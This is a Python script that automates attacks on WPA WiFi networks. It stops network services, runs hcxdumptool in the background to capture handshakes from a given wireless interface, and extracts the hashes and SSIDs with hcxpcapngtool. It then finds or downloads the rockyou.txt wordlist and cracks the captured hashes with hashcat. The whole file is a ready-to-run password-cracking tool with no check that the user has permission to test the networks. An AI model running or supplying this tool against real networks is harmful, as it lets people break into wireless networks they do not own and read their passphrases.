import time
import subprocess
import os
import binascii
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import sys
import argparse
import shutil


def check_sudo():
    if os.geteuid() != 0:
        print("This script requires sudo privileges. Please run the script with 'sudo'.")
        sys.exit(1)
class FileChangeHandler(FileSystemEventHandler):
    def __init__(self, file_name, output_file=None, hash_ssid_file=None):
        self.file_name = file_name
        self.output_file = output_file
        self.hash_ssid_file = hash_ssid_file
        self.processed_packets = set()
        self.line_counter = 0
        self.anywpas = False
        # If an output file is specified and it exists, load already processed hashes
        if self.output_file and os.path.exists(self.output_file):
            print(f"Loading already processed hashes from {self.output_file}...")
            with open(self.output_file, 'r') as f:
                for line in f:
                    parts = line.strip().split('] ', 1)
                    if len(parts) == 2:
                        self.processed_packets.add(parts[1])  # Add the hash part
                    self.line_counter += 1
            print(f"Loaded {self.line_counter} existing hashes.")
    def on_modified(self, event):
        if event.src_path == f'./{self.file_name}':
            self.process_wpa_file(event.src_path)
    def process_wpa_file(self, file_path):
        temp_hash_file = "temp_wpa_hashes.txt"
        self.anywpas = False  # Reset for each file processing
        try:
            # Run hcxpcapngtool to extract WPA hashes from pcapng file
            command = ['hcxpcapngtool', '-o', temp_hash_file, file_path]
            result = subprocess.run(command, capture_output=True, text=True)
            if result.returncode == 0 and os.path.exists(temp_hash_file):
                with open(temp_hash_file, 'r') as f:
                    for line in f:
                        wpa_hash = line.strip()
                        if wpa_hash and wpa_hash not in self.processed_packets:
                            ssid = "N/A"
                            parts = wpa_hash.split('*')
                            if len(parts) >= 6:
                                hex_ssid = parts[5]
                                try:
                                    ssid = binascii.unhexlify(hex_ssid).decode('utf-8', errors='ignore')
                                except binascii.Error:
                                    ssid = f"Invalid Hex SSID: {hex_ssid}"
                                except UnicodeDecodeError:
                                    ssid = f"Undecodable SSID: {hex_ssid}"
                            formatted_output = f"{self.line_counter + 1}: [SSID: {ssid}] {wpa_hash}"
                            print(formatted_output)
                            self.line_counter += 1
                            self.processed_packets.add(wpa_hash)
                            # Write to hash.hc22000
                            if self.output_file:
                                with open(self.output_file, 'a') as outfile:
                                    outfile.write(wpa_hash + '\n')
                                    self.anywpas = True
                            # Write to SsidHash.txt
                            if self.hash_ssid_file and self.anywpas:
                                with open(self.hash_ssid_file, 'a') as ssid_file:
                                    ssid_file.write(formatted_output + '\n')
        except FileNotFoundError:
            print(f"Something went wrong running hcxpcapngtool")
        except Exception as e:
            print(f"Error processing file with '\033[1;31mhcxpcapngtool\033[0m': {e}")
            sys.exit(1)
        finally:
            if os.path.exists(temp_hash_file):
                try:
                    os.remove(temp_hash_file)
                except Exception as e:
                    print(f"Warning: Could not delete temp file: {e}")
                    sys.exit(1)
def monitor_file(file_name, output_file, hash_ssid_file):
    path_to_watch = '.'
    event_handler = FileChangeHandler(file_name, output_file, hash_ssid_file)
    observer = Observer()
    observer.schedule(event_handler, path=path_to_watch, recursive=False)
    observer.start()
    start_time = time.time()
    timeout=25
    while not os.path.exists(file_name):
        if time.time() - start_time > timeout:
            print("Timeout reached while waiting for the file to be created.")
            print("Make sure you have used correct \033[1;31minterface\033[0m")
            print("Use \033[1;31m'iwconfig' or 'ip link'\033[0m to check available interfaces.")
            sys.exit(1)
        time.sleep(.3)
    print(f"Monitoring \033[1;34m{file_name}\033[0m for WPA handshakes...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping monitoring.")
        observer.stop()
    observer.join()
def run_hcxdumptool(interface,file_name):
    # Run hcxdumptool silently in background (no GUI)
    try:
        subprocess.Popen(
            ['hcxdumptool', '-i', interface, '-w', file_name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except:
        print(f"Something went wrong running hcxdumptool with interface \033[1;31m'{interface}'\033[0m.")
        return False
def check_interface(interface):
    # Use `ip link` to list interfaces and check if the provided one exists
    result = subprocess.run(['ip', 'link', 'show', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if result.returncode != 0:
        print(f"Error: Interface \033[1;31m'{interface}'\033[0m not found. Please ensure it exists and is enabled.")
        print("You can check available interfaces with: \033[1;31m'iwconfig'\033[0m or \033[1;31m'ip link'\033[0m")
        sys.exit(1)
def check_tools():
    tools = {
        "hcxdumptool": "hcxdumptool",
        "hcxpcapngtool": "hcxtools",
        "hashcat": "hashcat"
    }
    missing = [tool for tool in tools if shutil.which(tool) is None]
    if not missing:
        subprocess.run(['clear'])
        print("\033[1;32mAll required tools are installed.\033[0m")
        print("Running Program ...")
        return True
    print(f"\033[1;31mError: Missing tools: {', '.join(missing)}\033[0m")
    print("Install with: sudo apt install " + ' '.join(set(tools[t] for t in missing)))
    choice = input(f"Do you want to install {'both tools' if len(missing) > 1 else missing[0]} now? (y/n): ").strip().lower()
    if choice != 'y':
        print("Installation cancelled. Exiting.")
        sys.exit(1)
    try:
        # Get corresponding apt packages (no duplicates)
        apt_packages = list(set(tools[t] for t in missing))
        subprocess.run(['sudo', 'apt', 'install', '-y', *apt_packages], check=True)
        subprocess.run(['clear'])
        print(f"\033[1;32mSuccessfully installed: {', '.join(key for key,t in tools.items())}\033[0m")
        print("Running Program ...")
        return True
    except subprocess.CalledProcessError as e:
        print(f"\nError during installation: {e}")
        sys.exit(1)
def find_rockyou(start_path="/"):
    for root, dirs, files in os.walk(start_path):
        if "rockyou.txt" in files:
            full_path = os.path.join(root, "rockyou.txt")
            print(f"Found: {full_path}")
            return full_path
        elif "rockyou.txt.gz" in files:
            full_path_gz = os.path.join(root, "rockyou.txt.gz")
            print(f"Found compressed: {full_path_gz} - Unzipping it now...")
            subprocess.run(["gunzip", "-f", full_path_gz], check=True)
            full_path = full_path_gz.replace('.gz', '')
            return full_path_gz
    print(f"rockyou.txt not found in {start_path}.")
    return None
def using_hashcat(result):
    print("Cracking hashes with rockyou.txt ...")
    try:
        subprocess.run(['hashcat', '-m', '22000', 'hash.hc22000','-a','0', result,'--outfile','passwordcracked.txt'], check=True)
        print("\n\nCracking completed. Check passwordcracked.txt for results.")
        print("If passwordcracked.txt was not found, try using a different wordlist.")
        print("Use 'hashcat --help' for more options.")
        print("\033[1;31mIf hashcat stopped faster than expected, it may be due to hashes already been found on last run.\033[0m")
        if os.path.isfile(os.path.expanduser('~/.local/share/hashcat/hashcat.potfile')):
            print("You can find your already found passwords in \033[1;31m~/.local/share/hashcat/\033[0m folder.")
    except subprocess.CalledProcessError as e:
        print(f"Error during hashcat execution: {e}")
        sys.exit(1)
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Capture WPA handshakes with hcxdumptool and process them with hcxpcapngtool.")
    parser.add_argument('-i', '--interface', type=str, required=True, metavar='wlan0', help="Wireless interface to use (e.g., wlan0)")
    parser.add_argument('-w', '--write', type=str, metavar='name.pcapng', default='capture.pcapng', help="Output .pcapng file (default: capture.pcapng)")
    args = parser.parse_args()

    check_sudo()

    # Check and install required apt packages
    with open('requirements.txt') as f:
        packages = f.read().split()

    missing = [pkg for pkg in packages if subprocess.run(
        ['dpkg', '-s', pkg],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    ).returncode != 0]

    if missing:
        print(f'Installing missing packages: {", ".join(missing)}')
        subprocess.run(['sudo', 'apt', 'install', '-y', *missing], check=True)

    file_name = args.write

    if not file_name.endswith('.pcapng'):
        print("Output file must have a \033[1;31m.pcapng\033[0m extension.")
        sys.exit(1)

    check_interface(args.interface)

    # Tool check
    if check_tools():
        try:
            subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager.service'])
            subprocess.run(['sudo', 'systemctl', 'stop', 'wpa_supplicant.service'])

            # Start capture
            if run_hcxdumptool(args.interface, file_name):
                monitor_file(file_name, 'hash.hc22000', 'SsidHash.txt')
        finally:
            subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager.service'])
            subprocess.run(['sudo', 'systemctl', 'start', 'wpa_supplicant.service'])

            # Proceed only if hash file exists
            if not os.path.isfile('hash.hc22000'):
                print("\n\033[1;31mNo hash.hc22000 file found. Make sure the handshake capture was successful.\033[0m")
                sys.exit(1)

            # Ask to crack
            userInput = input("\nDo you want to start cracking the hashes? (y/n): ").strip().lower()
            if userInput != 'y':
                print("Exiting program.")
                sys.exit(1)
            print("This will use 100% of your CPU or GPU for cracking.")
            print("If you dont want 100% CPU or GPU usage \033[1;31mhashcat -h\033[0m for more options.")
            userInput = input("\nContinue? (y/n): ").strip().lower()
            if userInput != 'y':
                print("Exiting program.")
                sys.exit(1)
            # Try finding rockyou.txt
            print("SEARCHING FOR \033[1;31mrockyou.txt\033[0m wordlist...")
            result = find_rockyou("/usr") or find_rockyou("/")

            if result:
                try:
                    using_hashcat(result)
                except subprocess.CalledProcessError:
                    print("Hashcat failed. Check the format or contents of hash.hc22000.")
                    sys.exit(1)
            else:
                # Ask to download rockyou.txt
                userInput = input("\n\033[1;33mrockyou.txt not found. Do you want to download it using \033[1;31mwget\033[0m? (y/n): \033[0m").strip().lower()
                if userInput == 'y':
                    # Install wget if needed
                    if subprocess.run(['dpkg', '-s', 'wget'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
                        print("Installing wget...")
                        subprocess.run(['sudo', 'apt', 'install', '-y', 'wget'], check=True)
                    try:
                        subprocess.run(['wget', 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'], check=True)
                        print("\n\033[1;32mrockyou.txt downloaded successfully.\033[0m")
                        using_hashcat('rockyou.txt')
                    except subprocess.CalledProcessError:
                        print("\n\033[1;31mFailed to download rockyou.txt.\033[0m")
                        sys.exit(1)
                else:
                    print("Exiting program.")
                    sys.exit(0)
